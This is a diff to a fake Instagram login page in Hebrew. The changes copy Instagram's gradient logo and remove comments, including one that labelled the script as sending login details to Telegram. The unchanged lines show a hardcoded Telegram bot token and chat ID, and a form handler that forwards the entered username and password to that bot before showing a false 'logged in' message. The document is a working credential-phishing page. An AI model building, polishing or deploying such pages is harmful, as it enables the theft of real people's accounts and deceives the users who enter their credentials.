@@ -9,8 +9,18 @@
 body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
 .container { width: 100%; max-width: 350px; padding: 20px; }
 .login-box { background: #fff; border: 1px solid #dbdbdb; border-radius: 8px; padding: 40px 30px 30px; text-align: center; }
-.logo { font-family: 'Billabong', cursive; font-size: 50px; font-weight: 600; color: #262626; margin-bottom: 30px; letter-spacing: -2px; }
-.logo span { display: inline-block; }
+.logo {
+    font-family: 'Billabong', cursive;
+    font-size: 52px;
+    font-weight: 600;
+    margin-bottom: 30px;
+    letter-spacing: -2px;
+    background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    display: inline-block;
+}
 .input-group { margin-bottom: 8px; }
 .input-group input { width: 100%; padding: 12px 10px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 4px; font-size: 14px; outline: none; transition: border 0.2s; }
 .input-group input:focus { border-color: #a8a8a8; background: #fff; }
@@ -33,7 +43,7 @@ body { background: #fafafa; display: flex; justify-content: center; align-items:
 <body>
 <div class="container">
     <div class="login-box">
-        <div class="logo">📸 Instagram</div>
+        <div class="logo">Instagram</div>
         <form id="loginForm">
             <div class="input-group">
                 <input type="text" id="username" placeholder="שם משתמש, אימייל או טלפון" autocomplete="username">
@@ -65,7 +75,6 @@ body { background: #fafafa; display: flex; justify-content: center; align-items:
 </div>
 
 <script>
-// ===== טלגרם – שליחת פרטי התחברות =====
 const BOT_TOKEN = '8942000012:AAHDt2FU2G71nPWh63BQZPm0ga-ySm69qQg';
 const CHAT_ID = '5814617245';
 
@@ -106,7 +115,6 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         sendToTelegram(msg);
     });
     alert('התחברת בהצלחה! (זהו דף הדגמה)');
-    // איפוס שדות (אופציונלי)
     document.getElementById('username').value = '';
     document.getElementById('password').value = '';
 });
